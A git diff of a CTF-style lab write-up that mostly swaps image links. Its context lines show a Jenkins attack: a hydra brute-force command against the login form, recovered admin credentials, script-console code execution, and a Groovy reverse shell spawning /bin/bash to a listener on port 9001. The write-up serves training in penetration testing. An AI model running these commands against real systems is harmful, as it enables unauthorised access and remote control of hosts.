@@ -7,7 +7,7 @@ tags: [writeups, jenkins, portfwd, python]
 math: true
 mermaid: true
 image:
-  src: https://imgur.com/Yfejewk
+  src: ![image](https://user-images.githubusercontent.com/67085453/143765869-f4b70e8d-17d3-4e92-9311-e28dd167b4c9.png)
   width: 800
   height: 500
 ---
@@ -16,27 +16,26 @@ image:
 
 **> Information Gathering**<br>
 Started with the usual nmap scan and from the scan we can see active ports. port 22 (ssh) & port 30609 (jetty 9.4.27).<br>
-![nmap](img/pwn/jnrdev/nmap.png)
+![image](https://user-images.githubusercontent.com/67085453/143765662-e120b52a-a05e-4665-b2a1-55e4dacfe4d9.png)
 
 <br>
 Upon visiting the web service running on port _30609_, i found a login screen.<br>
-
-![web](https://imgur.com/klt9dCX)
+![image](https://user-images.githubusercontent.com/67085453/143765631-f7e788fc-8e83-4b1c-a97b-a639e13632de.png)<br>
 
 
 Since we dont have any credentials, the best option is to *bruteforce* the target web login. Below is the hydra command used<br>
 `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.150.150.38 -s 30609 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"`<br>
-![hydra](https://imgur.com/klt9dCX)<br>
+![image](https://user-images.githubusercontent.com/67085453/143765717-ed681b4b-3abe-43cb-b3c7-609f419e7275.png)<br>
 
 Hydra yield positive results. We have found the password for the admin user. The next step is to login on jetty webapp running on port 30609. *username == admin* & *password == matrix*<br>
-![login](https://imgur.com/OSvL3Nt)<br>
+![image](https://user-images.githubusercontent.com/67085453/143765743-22635b7b-a430-4f4a-889a-454bde37f372.png)<br>
      
 
 The credentials worked we are logged in now.<br>
-![logged in](https://imgur.com/uCw0l30)<br>
+![image](https://user-images.githubusercontent.com/67085453/143765751-202149be-2d13-4ce7-b865-b7b839156884.png)<br>
 
 After a short googling on how to abuse jenkins script console to rce we found a good post from <a href="https://github.com/gquere/pwn_jenkins">gquere</a>. With this information, we were able to build a script to test remote code execution on the target. <br>
-![test-rce](https://imgur.com/6WADwED)<br>
+![image](https://user-images.githubusercontent.com/67085453/143765761-0e7da699-8773-49fa-8df6-e511967f33a7.png)<br>
 
 
 Now  that we can execute commands on the target, its time to spawn a reverse shell. Below is the script I used.
@@ -46,7 +45,7 @@ int port=9001;
 String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 <br>
-![reverse-shell](https://imgur.com/jIE48Vg)<br>
+![image](https://user-images.githubusercontent.com/67085453/143765793-ff14889e-8cdb-4b2b-b144-003ab641c429.png)<br>
 
 
 **> Post Exploitation**<br>
